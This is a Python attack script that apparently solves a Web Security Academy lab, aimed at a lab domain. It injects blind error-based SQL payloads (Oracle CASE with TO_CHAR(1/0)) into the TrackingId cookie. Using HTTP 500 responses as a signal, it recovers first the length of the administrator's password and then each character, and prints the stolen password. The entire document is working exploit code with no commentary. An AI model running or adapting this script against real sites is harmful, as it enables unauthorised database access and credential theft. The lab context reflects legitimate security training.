#!/bin/python3

import requests
import time
import string

DOMAIN = "ac4c1f341f2ff467c0dc8ae5006700a4.web-security-academy.net"
LAB_URL = f"https://{DOMAIN}/"


def searchFound(response):
    return response.status_code == 500


def findPasswordLength(session):
    response = session.get(LAB_URL)
    cookies = session.cookies.get_dict()
    print(cookies)
    passwordLength = 0;
    trackingId = cookies["TrackingId"]
    while not searchFound(response):
        passwordLength += 1
        sqliPayload = f"'||(SELECT CASE WHEN LENGTH(password)={passwordLength} THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        evilTrackingId = trackingId + sqliPayload
        cookies["TrackingId"] = evilTrackingId
        response = session.get(LAB_URL, cookies=cookies)
        time.sleep(1)

    return passwordLength


def findPassword(session, passwordLength):
    response = session.get(LAB_URL)
    cookies = session.cookies.get_dict()
    trackingId = cookies["TrackingId"]
    password = ""
    counter = 0
    characters = string.digits + string.ascii_letters + string.punctuation
    characterIndex = 0
    while (counter < passwordLength and counter != len(password)):
        character = characters[characterIndex]
        sqliPayload = f"'||(SELECT CASE WHEN SUBSTR(password,{counter + 1},1)='{character}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
        evilTrackingId = trackingId + sqliPayload
        cookies["TrackingId"] = evilTrackingId
        response = session.get(LAB_URL, cookies=cookies)
        
        if searchFound(response):
            password += character
            counter += 1
            characterIndex = 0

        elif characterIndex == len(characters) - 1:
            counter += 1
            characterIndex = 0       

        else:
            characterIndex += 1
            
        time.sleep(1)

    return password
        

def main():
    with requests.session() as session:
        passwordLength = findPasswordLength(session)
        password = findPassword(session, passwordLength)
        if len(password) == passwordLength:
            print("[+] " + password)
        else:
            print("Password not found")


if __name__ == "__main__":
    main()
